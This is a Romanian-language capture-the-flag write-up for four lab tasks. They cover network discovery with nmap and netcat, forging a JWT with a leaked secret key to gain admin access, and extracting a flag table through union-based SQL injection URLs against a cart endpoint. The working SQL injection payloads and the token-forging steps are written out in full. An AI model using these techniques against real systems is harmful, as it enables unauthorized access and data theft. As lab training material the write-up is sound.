
    Task 1: message-send

    Din task.txt, ne putem gandi la ceva legat de un expeditor de
    mesaje si o conexiune la retea.
    Am rulat comanda ip addr show pentru a gasi adresa IP si reteaua.
    Apoi, rulam nmap <adresa IP/masca> pentru a gasi dispozitivele din retea. Se gasesc 6 dispozitive.
    Apoi, din moment ce este doar trimitere de mesaje, scanam porturile UDP cu comanda
    nmap -sU -p <adresa IP/masca> 18, portul 18 provine din indicatia din descrierea task-ului.
    Apoi gasim o adresa IP cu portul 18 deschis si rulam comanda
    nc -u <adresa IP> 18 si ascultam serverul. Scriem un mesaj si vom primi flag-ul.

    Task 2: ghost-in-the-shell

    Rulam comanda tcpdump -i eth0 si observam ca primim niste pachete pe portul 13840.
    Rulam nc -l -p 13840 si primim un text: Is there anyone here? Hey there, can you hear me?
    Din indiciul de background, ascultam in fundal si rulam tcpdump -i eth0 & nc -l -p 13840&
    Observam ca primim pachete pe alt port 13486.
    Rulam nc -l -p 13840 & nc -l -p 13486.
    Primim mesajele: Is there anyone here? Hey there, can you hear me?
                     You really really see this? Let's just try it one more time...
    Mai rulam inca o data si primim flag-ul.

    Task 3: jwt-auth

    Rulam nmap -sT <adresa IP/masca> pentru a vedea porturile tcp deschise.
    Rulam ./webtunnel.sh <adresa IP cu portul 5000 deschis> 5000 pentru a ne conecta la site si
    deschidem localhost:8080 in browser.
    Apoi inspectam codul sursa si deobfuscam codul javascript.
    Rulam nikto -h localhost:8080 si observam ca backend-ul este in Werkzeug/3.1.3 Python/3.12.8
    Cautam fisierul comun app.py si gasim codul backend-ului.
    Inregistram un utilizator cu toate atributele necesare cu o cerere POST.
    Apoi dupa ce ne-am logat, incercam sa ne logam ca admin. 
    Stim cheia Secret_Key din app.py si generam tokenul nou cu campul isAdmin = true si cheia secreta.
    Modificam cookie-ul si apoi in codul sursa html gasim flag-ul.

    Task 4: sqli-cart

    Rulam ./webtunnel.sh <adresa IP cu portul 9090 deschis> 9090.
    Din hinturi ne dam seama ca problema e la cos.
    Inspectam codul sursa. Daca injectam orice altceva care nu are un productID valid, vom primi o eroare
    de compilare. 
    Gasim cum se face o interogare: query = f"SELECT * FROM products WHERE id IN ({product_ids}) .
    Acum afisam tabelele din baza de date: http://localhost:8080/add_to_cart/2) UNION SELECT 1, name, 3, 4, 5 FROM sqlite_master WHERE type='table'--
    Gasim tabela : flagzLLDWdA.
    Rulam: http://localhost:8080/add_to_cart/2) UNION SELECT 1, sql, 3, 4, 5 FROM sqlite_master WHERE name='flagzLLDWdA'--
    Gasim value4438.
    Rulam: http://localhost:8080/add_to_cart/2)UNION SELECT 1, value4438, 3, 4, 5 FROM flagzLLDWdA-- si gasim flag-ul in cos.



